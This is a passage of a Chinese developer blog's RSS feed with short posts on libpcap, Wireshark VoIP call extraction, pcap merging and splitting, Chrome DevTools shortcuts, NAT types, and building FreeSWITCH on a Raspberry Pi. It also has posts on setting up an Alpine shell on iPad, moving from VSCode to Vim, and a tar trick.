&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gcc ./1.c -o 1.exe -lpcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;demo-libpcap git:&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;master&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ✗ ./1.exe eth0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Device: eth0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第一个栗子非常简单，仅仅是测试相关的库是否加载正确&lt;/p&gt;
&lt;h1 id=&#34;2c-获取默认网卡名称&#34;&gt;2.c 获取默认网卡名称&lt;/h1&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.tcpdump.org/pcap.html&#34;&gt;http://www.tcpdump.org/pcap.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>wireshark从pcap中提取语音文件</title>
      <link>https://wdd.js.org/network/zgftde/</link>
      <pubDate>Wed, 25 Nov 2020 10:34:52 +0800</pubDate>
      <guid>https://wdd.js.org/network/zgftde/</guid>
      <description>&lt;p&gt;使用tcpdump在服务端抓包，将抓包后的文件在wireshark中打开。&lt;/p&gt;
&lt;p&gt;然后选择：Telephony - VoIP Calls，wireshark可以从抓包文件中提取出SIP呼叫列表。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/zgftde/2022-10-29-18-38-18.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;呼叫列表页面&#34;&gt;呼叫列表页面&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/zgftde/2022-10-29-18-38-41.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在呼叫列表页面，选择一条呼叫记录，点击Flow Sequence， 可以查看该呼叫的SIP时序图。点击Play Stream， 可以播放该条呼叫的声音。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/zgftde/2022-10-29-18-38-53.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;RTPplay页面有播放按钮，点击播放可以听到通话声音。&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/zgftde/2022-10-29-18-39-02.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>wireshark合并和按时间截取pcap文件</title>
      <link>https://wdd.js.org/network/kgrco2/</link>
      <pubDate>Wed, 25 Nov 2020 10:11:22 +0800</pubDate>
      <guid>https://wdd.js.org/network/kgrco2/</guid>
      <description>&lt;p&gt;tcpdump可以在抓包时，按照指定时间间隔或者按照指定的包大小，产生新的pcap文件。用wireshark分析这些包时，往往需要将这些包做合并或者分离操作。&lt;/p&gt;
&lt;h1 id=&#34;mergecap&#34;&gt;mergecap&lt;/h1&gt;
&lt;p&gt;如果安装了Wireshark那么mergecap就会自动安装，可以使用它来合并多个pcap文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 按照数据包中的时间顺序合并文件
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mergecap -w output.pcap input1.pcap input2.pcap input3.pcap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 按照命令行中的输入数据包文件顺序合并文件
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// 不加-a, 可能会导致SIP时序图重复的问题
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mergecap -a -w output.pcap input1.pcap input2.pcap input3.pcap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;editcap&#34;&gt;editcap&lt;/h1&gt;
&lt;p&gt;对于一个很大的pcap文件，按照时间范围分割出新的pcap包&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;editcap -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2014-12-10 10:11:01&amp;#39;&lt;/span&gt; -B &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2014-12-10 10:21:01&amp;#39;&lt;/span&gt; input.pcap output.pcap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;参考 &lt;a href=&#34;https://blog.csdn.net/qq_19004627/article/details/82287172&#34;&gt;https://blog.csdn.net/qq_19004627/article/details/82287172&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Chrome 键盘快捷键参考</title>
      <link>https://wdd.js.org/posts/2020/11/muk33s/</link>
      <pubDate>Sun, 22 Nov 2020 15:19:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/11/muk33s/</guid>
      <description>&lt;p&gt;本页介绍 Chrome DevTools 中所有键盘快捷键的参考信息。一些快捷键全局可用，而其他快捷键会特定于单一面板。&lt;!-- raw HTML omitted --&gt;您也可以在提示中找到快捷键。将鼠标悬停在 DevTools 的 UI 元素上可以显示元素的提示。 如果元素有快捷键，提示将包含快捷键。&lt;/p&gt;
&lt;h2 id=&#34;访问-devtools&#34;&gt;访问 DevTools&lt;/h2&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;访问 DevTools&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;在 Windows 上&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;在 Mac 上&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打开 Developer Tools&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;F12、Ctrl + Shift + I&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Cmd + Opt + I&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打开/切换检查元素模式和浏览器窗口&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Ctrl + Shift + C&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Cmd + Shift + C&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;打开 Developer Tools 并聚焦到控制台&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Ctrl + Shift + J&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Cmd + Opt + J&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;检查检查器（取消停靠第一个后按）&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Ctrl + Shift + I&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Cmd + Opt + I&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;全局键盘快捷键&#34;&gt;全局键盘快捷键&lt;/h2&gt;
&lt;p&gt;下列键盘快捷键可以在所有 DevTools 面板中使用：&lt;/p&gt;</description>
    </item>
    <item>
      <title>RFC 6917 笔记</title>
      <link>https://wdd.js.org/posts/2020/11/ig536h/</link>
      <pubDate>Sun, 22 Nov 2020 10:46:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/11/ig536h/</guid>
      <description>&lt;p&gt;when considered in conjunction with deployment architectures that include 1:M and M:N combinations of Application Servers and Media Servers&lt;/p&gt;
&lt;p&gt;Media Resource Broker (MRB) entity, which manages the availability of Media Servers and the media resource demands of Application Servers.  The document includes potential deployment options for an MRB and appropriate interfaces to Application Servers and Media Servers.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/11/ig536h/2022-10-29-20-00-59.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/11/ig536h/2022-10-29-20-01-07.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/11/ig536h/2022-10-29-20-01-15.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>NAT</title>
      <link>https://wdd.js.org/posts/2020/11/nh68ws/</link>
      <pubDate>Sat, 21 Nov 2020 14:53:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/11/nh68ws/</guid>
      <description>&lt;h1 id=&#34;4种nat类型&#34;&gt;4种NAT类型&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;NAT类型&lt;/th&gt;
          &lt;th&gt;接收数据前是否要先发送数据&lt;/th&gt;
          &lt;th&gt;有没有可能检测下一个IP:PORT对是否打开&lt;/th&gt;
          &lt;th&gt;是否限制发包目的的IP:PORT&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;全锥型&lt;/td&gt;
          &lt;td&gt;no&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
          &lt;td&gt;no&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;限制锥型&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
          &lt;td&gt;only IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;端口限制型&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;对称型&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
          &lt;td&gt;no&lt;/td&gt;
          &lt;td&gt;yes&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nat穿透&#34;&gt;NAT穿透&lt;/h1&gt;
&lt;p&gt;• STUN: Simple traversal of UDP over NAT&lt;!-- raw HTML omitted --&gt;• TURN: Traversal of UDP over Relay NAT&lt;!-- raw HTML omitted --&gt;• ALG: Application Layer Gateways&lt;!-- raw HTML omitted --&gt;• MANUAL: Manual configuration (port forwarding)&lt;!-- raw HTML omitted --&gt;• UPNP: Universal Plug and Play&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/11/nh68ws/2022-10-29-20-19-45.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>BLF指示灯</title>
      <link>https://wdd.js.org/opensips/ch9/blf/</link>
      <pubDate>Fri, 20 Nov 2020 15:45:56 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/blf/</guid>
      <description>&lt;h1 id=&#34;what-is-a-busy-lamp-field-blf-and-why-do-you-need-it&#34;&gt;What Is a Busy Lamp Field (BLF) and Why Do You Need It?&lt;/h1&gt;
&lt;p&gt;Busy lamp field is a presence indicator that allows you to see who in your organization is available (or not) for a phone call at any given time.&lt;/p&gt;
&lt;p&gt;The term “busy lamp field” sounds a bit more involved than it really is. Put simply, it just means the ability to see who in your organization is available or not for a phone call at any given time.&lt;/p&gt;</description>
    </item>
    <item>
      <title>树莓派安装fs 1.10</title>
      <link>https://wdd.js.org/posts/2020/11/gtrrng/</link>
      <pubDate>Wed, 18 Nov 2020 13:04:21 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/11/gtrrng/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1. 将源码包上传到服务器, 并解压
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;安装依赖&#34;&gt;安装依赖&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt update
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt install autoconf &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libtool &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libtool-bin &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libjpeg-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libsqlite3-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libspeex-dev libspeexdsp-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libldns-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libedit-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libtiff-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;libavformat-dev
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libswscale-dev libsndfile-dev &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;liblua5.1-0-dev
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libcurl4-openssl-dev libpcre3-dev libopus-dev libpq-dev
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;配置&#34;&gt;配置&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./bootstrap.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./configure
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;make&#34;&gt;make&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参考：&lt;a href=&#34;https://www.cnblogs.com/MikeZhang/p/RaspberryPiInstallFreeSwitch.html&#34;&gt;https://www.cnblogs.com/MikeZhang/p/RaspberryPiInstallFreeSwitch.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>从VSCode切换到VIM</title>
      <link>https://wdd.js.org/vim/from-vscode-to-vim/</link>
      <pubDate>Wed, 11 Nov 2020 11:25:58 +0800</pubDate>
      <guid>https://wdd.js.org/vim/from-vscode-to-vim/</guid>
      <description>&lt;p&gt;为了能够在所有环境达到一致且极致的编程体验。我已经准备了好长的时间，从vscode切换到vim上做开发。&lt;/p&gt;
&lt;p&gt;我的切换计划分为多个阶段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;尝试：使用vim编辑单个文件&lt;/li&gt;
&lt;li&gt;练习：在vscode上安装vim插件，用了一段时间，感觉很别扭。&lt;/li&gt;
&lt;li&gt;徘徊：尝试使用vim作为开发，用了一段时间后，我发现开发速度相比于vim上很慢。特别是多文件编辑，文件创建。没有vscode编辑器的那种文件侧边栏，感觉写代码不太真实，云里雾里的感觉。然后我就又切换到vscode上开发。&lt;/li&gt;
&lt;li&gt;精进：我一直认为我vim已经学的差不多了，但是用vim的时候，总是感觉使不上劲。我觉得我没有系统的学习vim。然后我就去找了vim方面的书籍《vim实用技巧》。这本书我看过第一遍，我觉得自己之前对vim的理解太过肤浅。然后我就找机会从书中学习的技巧练习写代码。这本书我看了不下于三遍，每次看都有收获。每每遇到困惑的地方，我就会随手去查查。然后做总结。&lt;/li&gt;
&lt;li&gt;切换：从今年双十一，我开始使用vim做开发，直到今天，我一直都没有使用vscode, 并且我也把vscode卸载了。我之所以敢于卸载vscode, 是因为我觉得我在vim上开发的效率，已经高于vscode。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;熟练运用vim之后，我发现在vim上切换文件，打开文件还是创建文件，速度非常快，完全不需要鼠标点击。&lt;/p&gt;
&lt;p&gt;除了没有右边的代码预览视图，vim功能都有。而且我越用越觉得vim的netrw插件要比vscode左边栏的文件树窗口好用。&lt;/p&gt;
&lt;p&gt;还有代码搜索，我使用了ack， 用这个命令搜索关键词，简直快的飞起。&lt;/p&gt;</description>
    </item>
    <item>
      <title>在iPhone iPad上搭建Linux本地开发环境</title>
      <link>https://wdd.js.org/posts/2020/11/kfl9zd/</link>
      <pubDate>Mon, 02 Nov 2020 20:06:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/11/kfl9zd/</guid>
      <description>&lt;p&gt;我在家里的时候，大部分时间用iPad远程连接到服务端做开发。虽然也是蛮方便的，但是每年都需要买个云服务器，也是一笔花费，最近看到一个App, 可以在手机上直接运行一个Linux环境，试了一下，果然还不错。下面记录一下安装过程。&lt;/p&gt;
&lt;h1 id=&#34;step1-下载ish&#34;&gt;step1: 下载iSh&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/11/kfl9zd/2022-10-29-20-05-02.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step2-安装apk&#34;&gt;step2: 安装apk&lt;/h1&gt;
&lt;p&gt;这个软件下载之后打开，就直接进到shell界面，虽然它是一个基于alpine的环境，但是没有apk， 我们需要手工安装这个包管理工具。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget -qO- http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86/apk-tools-static-2.10.5-r1.apk | tar -xz sbin/apk.static &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./sbin/apk.static add apk-tools &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; rm sbin/apk.static &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; rmdir sbin 2&amp;gt; /dev/null
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;温馨提示：在iSh的右下角，有个按钮是粘贴按钮。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2020/11/kfl9zd/2022-10-29-20-05-17.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step3-apk-update&#34;&gt;step3: apk update&lt;/h1&gt;
&lt;p&gt;虽然安装了apk,  但是不更新的话，可能很多安装包都没有，所以最好先更新。&lt;/p&gt;
&lt;p&gt;在更新之前。最好执行下面的命令，把apk的源换成清华的，这样之后的安装软件会比较快点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&amp;#39;&lt;/span&gt; /etc/apk/repositories
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apk update
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;step4-安装各种开发工具-git-zsh-tmux-vim&#34;&gt;step4: 安装各种开发工具 git zsh tmux vim&amp;hellip;&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apk add git zsh tmux vim
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;step5-安装oh-my-zsh-这是必不可少的神器&#34;&gt;step5: 安装oh-my-zsh 这是必不可少的神器&lt;/h1&gt;
&lt;p&gt;因为从github上克隆oh-my-zsh可能会很慢，所以我用了码云上的一个仓库。 这样速度就会很快了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chsh -s &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;which zsh&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;step6-安装nodejs-python-golang等&#34;&gt;step6: 安装nodejs python golang等。&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apk add nodejs python3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面看到输出了nodejs和python的版本，说明安装成功。另外ish支持换肤的。之前的白色的，下面的是黑色的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>tar打包小技巧: 替换根目录</title>
      <link>https://wdd.js.org/posts/2020/10/sxuez4/</link>
      <pubDate>Tue, 27 Oct 2020 11:23:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/10/sxuez4/</guid>
      <description>&lt;p&gt;环境mac&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 这个目录打包之后，内部的顶层目录是dist, 解压之后，有可能覆盖到以前的dist&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -zcvf demo.tar.gz dist/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 使用这个命令，顶层目录将会被修改成demo-0210&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -s /^dist/demo-0210/ -zcvf demo.tar.gz dist/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>讲价的学问</title>
      <link>https://wdd.js.org/posts/2020/10/ahtqix/</link>
      <pubDate>Mon, 05 Oct 2020 10:11:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/10/ahtqix/</guid>
      <description>&lt;h1 id=&#34;只要有价格就可以讲价&#34;&gt;&lt;strong&gt;只要有价格，就可以讲价&lt;/strong&gt;&lt;/h1&gt;
